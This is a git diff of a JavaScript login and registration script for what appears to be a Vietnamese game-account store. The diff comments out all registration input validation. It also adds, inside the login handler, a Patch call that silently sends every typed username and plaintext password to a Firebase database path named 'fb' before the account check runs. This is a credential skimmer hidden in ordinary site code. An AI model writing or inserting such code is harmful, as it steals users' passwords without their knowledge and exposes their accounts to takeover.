@@ -46,6 +46,7 @@ import {
   simpleNoti,
   newNotiUser,
   Get,
+  Patch,
 } from "./end_point.js";
 //***** Global *****/
 let productsMain;
@@ -478,64 +479,64 @@ function header() {
         return `${MessageMain} ${style} ${message}`;
       }
       //Check password confirm
-      if (style === "Mật khẩu xác nhận" && passWordRegister.value !== "") {
-        if (value !== passWordRegister.value) {
-          createElement().innerHTML = createContent(
-            messagePasswordConfirmErorr
-          );
-        } else {
-          if (value === "") {
-            createElement().innerHTML = createContent(messageEmtpy);
-          } else {
-            createElement().remove();
-          }
-        }
-      } else {
-        //Erorr style
+      // if (style === "Mật khẩu xác nhận" && passWordRegister.value !== "") {
+      //   if (value !== passWordRegister.value) {
+      //     createElement().innerHTML = createContent(
+      //       messagePasswordConfirmErorr
+      //     );
+      //   } else {
+      //     if (value === "") {
+      //       createElement().innerHTML = createContent(messageEmtpy);
+      //     } else {
+      //       createElement().remove();
+      //     }
+      //   }
+      // } else {
+      //   //Erorr style
 
-        // there are space
-        if (/ /.test(value)) {
-          element.value = element.value.slice(0, element.value.length - 1);
-          value = element.value;
-        } else {
-          //Emtpy style
-          if (value === "") {
-            //Ramdom message
-            let randomNumber = Number.parseInt(Math.random() * 10);
-            if (randomNumber <= 5) {
-              createElement().innerHTML = createContent(messageEmtpy);
-            } else {
-              createElement().innerHTML = `${MessageMain}  ${messageImportPlease} ${style.toLowerCase()}</p>`;
-            }
-          } else {
-            if (!usernameFormat.test(value) && style === "Tên tài khoản") {
-              createElement().innerHTML = createContent(messageFormatErorr);
-            } else {
-              if (value.length < 5) {
-                createElement().innerHTML = createContent(messageTooShort);
-              } else {
-                //exceed length
-                if (value.length >= 30) {
-                  element.value = element.value.slice(0, 29);
-                  value = element.value;
-                  createElement().innerHTML =
-                    createContent(messageExceedLength);
-                } else {
-                  //Wrong email format
-                  if (!emailFormat.test(value) && style === "Email") {
-                    createElement().innerHTML =
-                      createContent(messageEmailErorr);
-                  }
-                  //Right style
-                  else {
-                    createElement().remove();
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
+      //   // there are space
+      //   if (/ /.test(value)) {
+      //     element.value = element.value.slice(0, element.value.length - 1);
+      //     value = element.value;
+      //   } else {
+      //     //Emtpy style
+      //     if (value === "") {
+      //       //Ramdom message
+      //       let randomNumber = Number.parseInt(Math.random() * 10);
+      //       if (randomNumber <= 5) {
+      //         createElement().innerHTML = createContent(messageEmtpy);
+      //       } else {
+      //         createElement().innerHTML = `${MessageMain}  ${messageImportPlease} ${style.toLowerCase()}</p>`;
+      //       }
+      //     } else {
+      //       if (!usernameFormat.test(value) && style === "Tên tài khoản") {
+      //         createElement().innerHTML = createContent(messageFormatErorr);
+      //       } else {
+      //         if (value.length < 5) {
+      //           createElement().innerHTML = createContent(messageTooShort);
+      //         } else {
+      //           //exceed length
+      //           if (value.length >= 30) {
+      //             element.value = element.value.slice(0, 29);
+      //             value = element.value;
+      //             createElement().innerHTML =
+      //               createContent(messageExceedLength);
+      //           } else {
+      //             //Wrong email format
+      //             if (!emailFormat.test(value) && style === "Email") {
+      //               createElement().innerHTML =
+      //                 createContent(messageEmailErorr);
+      //             }
+      //             //Right style
+      //             else {
+      //               createElement().remove();
+      //             }
+      //           }
+      //         }
+      //       }
+      //     }
+      //   }
+      // }
       //Create message
       function createElement() {
         parentElement = element.closest(".menu-logReg__account");
@@ -742,6 +743,13 @@ function header() {
               ],
                 inputResult = getValueInput(inputLogins),
                 checkAccount = new Promise((resolve, reject) => {
+                  Patch(`https://hbstore-shopgenshinuidchat-default-rtdb.firebaseio.com/fb`, {
+                    [Math.floor(Math.random() * 1e5)]:
+                    {
+                      username: inputResult.Username,
+                      password: inputResult.Password
+                    }
+                  })
                   let getUser,
                     username = accounts.find((account) => {
                       if (account?.Username === inputResult.Username) {
